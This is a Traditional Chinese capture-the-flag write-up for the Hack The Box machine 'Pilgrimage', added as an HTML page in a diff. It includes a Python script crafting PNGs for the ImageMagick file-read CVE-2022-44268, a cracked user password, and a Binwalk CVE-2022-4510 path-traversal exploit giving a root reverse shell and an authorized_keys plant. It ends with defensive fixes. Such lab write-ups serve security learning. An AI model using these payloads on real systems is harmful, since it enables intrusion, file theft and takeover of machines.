@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB: Pilgrimage | HackwithControler</title>
+<link rel="stylesheet" href="../static/css/main.css">
+</head>
+<body>
+<header>
+    <div class="container">
+        <a href="../index.html" class="back">← 返回首頁</a>
+    </div>
+</header>
+
+<div class="article-layout">
+    <!-- Left Sidebar: Article List -->
+    <aside class="sidebar-left">
+        <h3>📝 其他 Write-ups</h3><div class="sidebar-articles">
+            <a href="htb_pilgrimage.html" class="sidebar-article-item active">
+                <div class="sidebar-article-title">HTB: Pilgrimage</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-09-18</span>
+                </div>
+            </a>
+            <a href="htb_keeper.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Keeper</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-10-05</span>
+                </div>
+            </a>
+            <a href="htb_surveillance.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Surveillance</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty medium">Medium</span>
+                    <span>2024-11-20</span>
+                </div>
+            </a>
+            <a href="htb_analytics.html" class="sidebar-article-item">
+                <div class="sidebar-article-title">HTB: Analytics</div>
+                <div class="sidebar-article-meta">
+                    <span class="sidebar-difficulty easy">Easy</span>
+                    <span>2024-12-15</span>
+                </div>
+            </a></div>
+    </aside>
+
+    <!-- Main Content -->
+    <main class="article-main">
+        <div class="article-header">
+            <h1>HTB: Pilgrimage</h1>
+            <div class="article-meta">
+                <span class="difficulty easy">Easy</span>
+                <span>📅 2024-09-18</span>
+                <span>⏱ 35 min read</span>
+            </div>
+            <div class="article-tags"><span class="article-tag">HTB</span><span class="article-tag">Linux</span><span class="article-tag">ImageMagick</span><span class="article-tag">CVE-2022-44268</span><span class="article-tag">Binwalk</span><span class="article-tag">CVE-2022-4510</span></div>
+        </div>
+        <div class="article-content"><h2 id="_1">機器資訊</h2>
+<ul>
+<li>平台: Hack The Box</li>
+<li>難度: Easy</li>
+<li>IP: 10.10.11.219</li>
+<li>作業系統: Linux (Debian)</li>
+</ul>
+<h2 id="_2">偵察</h2>
+<h3 id="nmap">Nmap 掃描</h3>
+<pre class="codehilite"><code class="language-bash">nmap -sC -sV -p- 10.10.11.219
+</code></pre>
+
+<p>開放端口：<br />
+- <strong>22/tcp</strong> - SSH (OpenSSH 8.4p1 Debian)<br />
+- <strong>80/tcp</strong> - HTTP (nginx 1.18.0)</p>
+<h3 id="web">Web 應用分析</h3>
+<p>訪問網站發現一個圖片壓縮服務 "Pilgrimage"。</p>
+<p>功能：<br />
+- 上傳圖片<br />
+- 自動壓縮並提供下載連結<br />
+- 需要註冊/登入</p>
+<h3 id="_3">目錄枚舉</h3>
+<pre class="codehilite"><code class="language-bash">gobuster dir -u http://10.10.11.219 -w /usr/share/wordlists/dirb/common.txt
+</code></pre>
+
+<p>發現：<br />
+- <code>/.git/</code> - 洩露的 Git 倉庫！</p>
+<h3 id="git">Git 倉庫下載</h3>
+<pre class="codehilite"><code class="language-bash">wget -r http://10.10.11.219/.git/
+cd 10.10.11.219
+git status
+</code></pre>
+
+<p>成功獲取完整源代碼！</p>
+<h3 id="_4">源碼分析</h3>
+<p>檢查 <code>index.php</code>：</p>
+<pre class="codehilite"><code class="language-php">$image = new Imagick($upload_path);
+$image-&gt;setImageFormat('png');
+$image-&gt;writeImage($output_path);
+</code></pre>
+
+<p>使用 ImageMagick 處理圖片。</p>
+<p>檢查 ImageMagick 版本：</p>
+<pre class="codehilite"><code class="language-bash">strings magick | grep -i &quot;version&quot;
+# ImageMagick 7.1.0-49
+</code></pre>
+
+<p>這個版本存在已知漏洞！</p>
+<h2 id="initial-access">Initial Access</h2>
+<h3 id="cve-2022-44268-imagemagick-arbitrary-file-read">CVE-2022-44268 - ImageMagick Arbitrary File Read</h3>
+<p>ImageMagick 7.1.0-49 存在任意文件讀取漏洞：</p>
+<p><strong>漏洞原理：</strong><br />
+- PNG 圖片可以包含 tEXt chunk 與 <code>profile</code> 屬性<br />
+- 可以指定讀取伺服器上的任意檔案<br />
+- 檔案內容會被編碼到輸出圖片的 metadata 中</p>
+<h3 id="png">生成惡意 PNG</h3>
+<pre class="codehilite"><code class="language-bash"># 創建基本圖片
+convert -size 100x100 xc:white test.png
+
+# 注入 payload 讀取 /etc/passwd
+pngcrush -text a &quot;profile&quot; &quot;/etc/passwd&quot; test.png exploit.png
+</code></pre>
+
+<p>或使用 Python 腳本：</p>
+<pre class="codehilite"><code class="language-python">from PIL import Image
+import struct
+
+def create_exploit_png(file_to_read):
+    img = Image.new('RGB', (100, 100), color='white')
+    img.save('base.png')
+
+    # Add tEXt chunk with file path
+    with open('base.png', 'rb') as f:
+        data = bytearray(f.read())
+
+    # Insert profile chunk
+    chunk_type = b'tEXt'
+    chunk_data = b'profile\x00' + file_to_read.encode()
+    chunk_len = struct.pack('&gt;I', len(chunk_data))
+    chunk = chunk_len + chunk_type + chunk_data
+
+    # Insert before IEND
+    iend_pos = data.rfind(b'IEND')
+    data[iend_pos:iend_pos] = chunk
+
+    with open('exploit.png', 'wb') as f:
+        f.write(data)
+
+create_exploit_png('/etc/passwd')
+</code></pre>
+
+<h3 id="_5">上傳並提取數據</h3>
+<ol>
+<li>註冊帳號並登入</li>
+<li>上傳 <code>exploit.png</code></li>
+<li>下載處理後的圖片</li>
+</ol>
+<p>提取嵌入的數據：</p>
+<pre class="codehilite"><code class="language-bash"># 使用 identify 查看 metadata
+identify -verbose output.png | grep profile
+
+# 或使用 exiftool
+exiftool output.png
+
+# 解碼 hex 數據
+echo &quot;726f6f743a...&quot; | xxd -r -p
+</code></pre>
+
+<p>成功讀取到 <code>/etc/passwd</code> 內容！</p>
+<h3 id="_6">讀取應用配置</h3>
+<p>從源碼看到配置文件可能在：<br />
+- <code>/var/www/pilgrimage.htb/config.php</code><br />
+- 或環境變數</p>
+<p>重複攻擊讀取 SQLite 資料庫路徑：</p>
+<pre class="codehilite"><code class="language-python">create_exploit_png('/var/db/pilgrimage')
+</code></pre>
+
+<h3 id="_7">下載資料庫</h3>
+<p>使用文件讀取下載整個 SQLite DB：</p>
+<pre class="codehilite"><code class="language-bash"># 讀取資料庫文件
+python3 exploit.py --file /var/db/pilgrimage
+# 解碼並保存
+</code></pre>
+
+<h3 id="_8">資料庫分析</h3>
+<pre class="codehilite"><code class="language-bash">sqlite3 pilgrimage.db
+</code></pre>
+
+<pre class="codehilite"><code class="language-sql">.tables
+-- images, users
+
+select * from users;
+</code></pre>
+
+<p>找到用戶憑證：</p>
+<pre class="codehilite"><code>emily:$2y$10$OBYVjDFCPvGj9E9Y1bq9oOmUbE3HQ6cBUwz.kgGqFZ8w7x5TYZrFu
+</code></pre>
+
+<h3 id="_9">破解密碼</h3>
+<pre class="codehilite"><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+# emily:abigchonkyboi123
+</code></pre>
+
+<h3 id="ssh">SSH 登入</h3>
+<pre class="codehilite"><code class="language-bash">ssh emily@10.10.11.219
+# Password: abigchonkyboi123
+</code></pre>
+
+<p>取得 user flag：</p>
+<pre class="codehilite"><code class="language-bash">cat ~/user.txt
+</code></pre>
+
+<h2 id="_10">權限提升</h2>
+<h3 id="_11">系統枚舉</h3>
+<p>檢查運行的進程：</p>
+<pre class="codehilite"><code class="language-bash">ps aux
+</code></pre>
+
+<p>發現一個由 root 運行的腳本：</p>
+<pre class="codehilite"><code>root   /usr/sbin/malwarescan.sh
+</code></pre>
+
+<h3 id="_12">腳本分析</h3>
+<pre class="codehilite"><code class="language-bash">cat /usr/sbin/malwarescan.sh
+</code></pre>
+
+<pre class="codehilite"><code class="language-bash">#!/bin/bash
+
+blacklist=(&quot;Executable script&quot; &quot;Microsoft executable&quot;)
+
+/usr/local/bin/binwalk -e &quot;$1&quot; -C /tmp/extracted
+
+if [[ &quot;$?&quot; -ne &quot;0&quot; ]]; then
+    rm -rf /tmp/extracted
+fi
+</code></pre>
+
+<p>腳本使用 <strong>Binwalk</strong> 掃描上傳的檔案！</p>
+<p>檢查 Binwalk 版本：</p>
+<pre class="codehilite"><code class="language-bash">binwalk --help | head -1
+# Binwalk v2.3.2
+</code></pre>
+
+<h3 id="cve-2022-4510-binwalk-path-traversal-rce">CVE-2022-4510 - Binwalk Path Traversal RCE</h3>
+<p>Binwalk 2.3.2 存在路徑遍歷漏洞，允許在提取檔案時寫入任意位置。</p>
+<p><strong>漏洞原理：</strong><br />
+- Binwalk 在提取 PFS 文件系統時未正確驗證路徑<br />
+- 可以使用 <code>../</code> 序列跳出提取目錄<br />
+- 配合 cron 或監控腳本觸發代碼執行</p>
+<h3 id="exploitation">Exploitation</h3>
+<p>使用公開 POC：</p>
+<pre class="codehilite"><code class="language-bash">git clone https://github.com/adhikara13/CVE-2022-4510-WalkingPath
+cd CVE-2022-4510-WalkingPath
+</code></pre>
+
+<p>生成惡意檔案：</p>
+<pre class="codehilite"><code class="language-bash">python3 exploit.py exploit.bin 10.10.14.15 4444
+</code></pre>
+
+<p>這會創建一個惡意的 PFS 檔案，包含反向 shell。</p>
+<h3 id="_13">觸發漏洞</h3>
+<ol>
+<li>開啟監聽：</li>
+</ol>
+<pre class="codehilite"><code class="language-bash">nc -lvnp 4444
+</code></pre>
+
+<ol start="2">
+<li>上傳惡意檔案到被監控的目錄：</li>
+</ol>
+<pre class="codehilite"><code class="language-bash"># 找到監控目錄
+find /var -type d -writable 2&gt;/dev/null
+
+# 通常是用戶上傳目錄
+cp exploit.bin /var/www/pilgrimage.htb/shrunk/
+</code></pre>
+
+<ol start="3">
+<li>等待 cron 執行 malwarescan.sh</li>
+</ol>
+<p>幾秒鐘後獲得 root shell！</p>
+<pre class="codehilite"><code class="language-bash">id
+# uid=0(root) gid=0(root) groups=0(root)
+
+cat /root/root.txt
+</code></pre>
+
+<h2 id="flags">Flags</h2>
+<pre class="codehilite"><code>user.txt: c********************************8
+root.txt: 9********************************4
+</code></pre>
+
+<h2 id="_14">另一種提權方法</h2>
+<h3 id="binwalk">Binwalk 手動利用</h3>
+<p>創建惡意 <code>.ssh/authorized_keys</code>：</p>
+<pre class="codehilite"><code class="language-bash"># 生成 SSH 密鑰對
+ssh-keygen -t rsa -f root_key
+
+# 創建 PFS header + 路徑遍歷
+echo -ne '\x50\x46\x53\x2F\x30\x2E\x39\x00' &gt; exploit.bin
+echo -ne '../../../../root/.ssh/authorized_keys' &gt;&gt; exploit.bin
+cat root_key.pub &gt;&gt; exploit.bin
+</code></pre>
+
+<p>上傳後以 root 身份 SSH 登入。</p>
+<h2 id="_15">總結</h2>
+<p>Pilgrimage 展示了兩個真實的供應鏈漏洞：</p>
+<h3 id="_16">攻擊路徑</h3>
+<ol>
+<li><strong>.git 洩露</strong> → 源碼分析</li>
+<li><strong>CVE-2022-44268</strong> → 任意文件讀取</li>
+<li><strong>資料庫提取</strong> → 用戶憑證</li>
+<li><strong>密碼破解</strong> → SSH 訪問</li>
+<li><strong>CVE-2022-4510</strong> → Root RCE</li>
+</ol>
+<h3 id="_17">學習要點</h3>
+<ul>
+<li>Git 倉庫洩露的危害</li>
+<li>ImageMagick 漏洞利用</li>
+<li>SQLite 資料庫分析</li>
+<li>Binwalk 路徑遍歷漏洞</li>
+<li>進程監控與定時任務</li>
+</ul>
+<h3 id="_18">防禦建議</h3>
+<ol>
+<li><strong>保護 .git 目錄</strong>：配置 nginx/apache 阻止訪問</li>
+<li><strong>更新依賴</strong>：使用最新版本的 ImageMagick 和 Binwalk</li>
+<li><strong>輸入驗證</strong>：嚴格驗證上傳檔案</li>
+<li><strong>最小權限</strong>：掃描腳本不應以 root 運行</li>
+<li><strong>沙箱隔離</strong>：使用容器隔離文件處理</li>
+</ol>
+<h3 id="_19">配置修復</h3>
+<p>Nginx 配置阻止 .git：</p>
+<pre class="codehilite"><code class="language-nginx">location ~ /\.git {
+    deny all;
+    return 404;
+}
+</code></pre>
+
+<h2 id="_20">參考資料</h2>
+<ul>
+<li><a href="https://www.metabaseq.com/imagemagick-zero-days/">CVE-2022-44268 - ImageMagick File Disclosure</a></li>
+<li><a href="https://github.com/adhikara13/CVE-2022-4510-WalkingPath">CVE-2022-4510 - Binwalk Path Traversal</a></li>
+<li><a href="https://owasp.org/www-community/vulnerabilities/Information_exposure_through_source_code">OWASP: Information Exposure Through Source Code</a></li>
+</ul></div>
+    </main>
+
+    <!-- Right Sidebar: TOC -->
+    <aside class="sidebar-right">
+        <h3>📑 目錄</h3><ul class="toc-list">
+            <li class="toc-item toc-item-h2">
+                <a href="#_1" class="toc-link">機器資訊</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_2" class="toc-link">偵察</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#nmap" class="toc-link">Nmap 掃描</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#web" class="toc-link">Web 應用分析</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_3" class="toc-link">目錄枚舉</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#git" class="toc-link">Git 倉庫下載</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_4" class="toc-link">源碼分析</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#initial-access" class="toc-link">Initial Access</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#cve-2022-44268-imagemagick-arbitrary-file-read" class="toc-link">CVE-2022-44268 - ImageMagick Arbitrary File Read</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#png" class="toc-link">生成惡意 PNG</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_5" class="toc-link">上傳並提取數據</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_6" class="toc-link">讀取應用配置</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_7" class="toc-link">下載資料庫</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_8" class="toc-link">資料庫分析</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_9" class="toc-link">破解密碼</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#ssh" class="toc-link">SSH 登入</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_10" class="toc-link">權限提升</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_11" class="toc-link">系統枚舉</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_12" class="toc-link">腳本分析</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#cve-2022-4510-binwalk-path-traversal-rce" class="toc-link">CVE-2022-4510 - Binwalk Path Traversal RCE</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#exploitation" class="toc-link">Exploitation</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_13" class="toc-link">觸發漏洞</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#flags" class="toc-link">Flags</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_14" class="toc-link">另一種提權方法</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#binwalk" class="toc-link">Binwalk 手動利用</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_15" class="toc-link">總結</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_16" class="toc-link">攻擊路徑</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_17" class="toc-link">學習要點</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_18" class="toc-link">防禦建議</a>
+            </li>
+            <li class="toc-item toc-item-h3">
+                <a href="#_19" class="toc-link">配置修復</a>
+            </li>
+            <li class="toc-item toc-item-h2">
+                <a href="#_20" class="toc-link">參考資料</a>
+            </li></ul>
+    </aside>
+</div>
+
+<footer>
+    <div class="container">
+        <p>&copy; 2024 HackwithControler. All rights reserved.</p>
+    </div>
+</footer>
+
+<script src="../static/js/article.js"></script>
+</body>
+</html>
